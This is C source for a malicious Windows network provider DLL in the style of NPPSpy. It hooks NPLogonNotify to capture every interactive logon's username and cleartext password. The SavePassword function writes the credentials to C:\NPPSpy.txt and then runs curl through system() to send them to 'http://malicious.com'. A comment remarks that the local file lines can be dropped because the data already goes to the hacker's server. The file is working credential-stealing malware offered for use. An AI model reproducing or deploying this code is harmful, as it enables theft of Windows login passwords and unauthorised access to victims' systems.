#include <Windows.h>
#include <stdio.h>
// from npapi.h
#define WNNC_SPEC_VERSION                0x00000001
#define WNNC_SPEC_VERSION51              0x00050001
#define WNNC_NET_TYPE                    0x00000002
#define WNNC_START                       0x0000000C
#define WNNC_WAIT_FOR_START              0x00000001

//from ntdef.h
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// from NTSecAPI.h
typedef enum _MSV1_0_LOGON_SUBMIT_TYPE
{
	MsV1_0InteractiveLogon = 2,
	MsV1_0Lm20Logon,
	MsV1_0NetworkLogon,
	MsV1_0SubAuthLogon,
	MsV1_0WorkstationUnlockLogon = 7,
	MsV1_0S4ULogon = 12,
	MsV1_0VirtualLogon = 82,
	MsV1_0NoElevationLogon = 83,
	MsV1_0LuidLogon = 84,
} MSV1_0_LOGON_SUBMIT_TYPE, * PMSV1_0_LOGON_SUBMIT_TYPE;

// from NTSecAPI.h
typedef struct _MSV1_0_INTERACTIVE_LOGON
{
	MSV1_0_LOGON_SUBMIT_TYPE MessageType;
	UNICODE_STRING LogonDomainName;
	UNICODE_STRING UserName;
	UNICODE_STRING Password;
} MSV1_0_INTERACTIVE_LOGON, * PMSV1_0_INTERACTIVE_LOGON;


void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
    HANDLE hFile;
    DWORD dwWritten;
    int bufferSize;
    char* usernameAnsi;
    char* passwordAnsi;

    hFile = CreateFile(TEXT("C:\\NPPSpy.txt"),
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        //since it sends the password to the hacker's server, you can remove these lines
        SetFilePointer(hFile, 0, NULL, FILE_END);
        WriteFile(hFile, username->Buffer, username->Length, &dwWritten, 0);
        WriteFile(hFile, L" -> ", 8, &dwWritten, 0);
        WriteFile(hFile, password->Buffer, password->Length, &dwWritten, 0);
        WriteFile(hFile, L"\r\n", 4, &dwWritten, 0);
        CloseHandle(hFile);

        bufferSize = WideCharToMultiByte(CP_ACP, 0, username->Buffer, username->Length / sizeof(WCHAR), NULL, 0, NULL, NULL);
        usernameAnsi = (char*)malloc(bufferSize + 1);
        WideCharToMultiByte(CP_ACP, 0, username->Buffer, username->Length / sizeof(WCHAR), usernameAnsi, bufferSize, NULL, NULL);
        usernameAnsi[bufferSize] = '\0';

        bufferSize = WideCharToMultiByte(CP_ACP, 0, password->Buffer, password->Length / sizeof(WCHAR), NULL, 0, NULL, NULL);
        passwordAnsi = (char*)malloc(bufferSize + 1);
        WideCharToMultiByte(CP_ACP, 0, password->Buffer, password->Length / sizeof(WCHAR), passwordAnsi, bufferSize, NULL, NULL);
        passwordAnsi[bufferSize] = '\0';

        char command[1024]; 
        snprintf(command, sizeof(command), "curl \"http://malicious.com/?u=%s&p=%s\"", usernameAnsi, passwordAnsi);
        system(command);

        free(usernameAnsi);
        free(passwordAnsi);
    }
}


__declspec(dllexport)
DWORD
APIENTRY
NPGetCaps(
	DWORD nIndex
)
{
	switch (nIndex)
	{
		case WNNC_SPEC_VERSION:
			return WNNC_SPEC_VERSION51;

		case WNNC_NET_TYPE:
			return WNNC_CRED_MANAGER;

		case WNNC_START:
			return WNNC_WAIT_FOR_START;

		default:
			return 0;
	}
}


__declspec(dllexport)
DWORD
APIENTRY
NPLogonNotify(
	PLUID lpLogonId,
	LPCWSTR lpAuthInfoType,
	LPVOID lpAuthInfo,
	LPCWSTR lpPrevAuthInfoType,
	LPVOID lpPrevAuthInfo,
	LPWSTR lpStationName,
	LPVOID StationHandle,
	LPWSTR* lpLogonScript
)
{
	SavePassword(
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password)
	);
	lpLogonScript = NULL;
	return WN_SUCCESS;
}
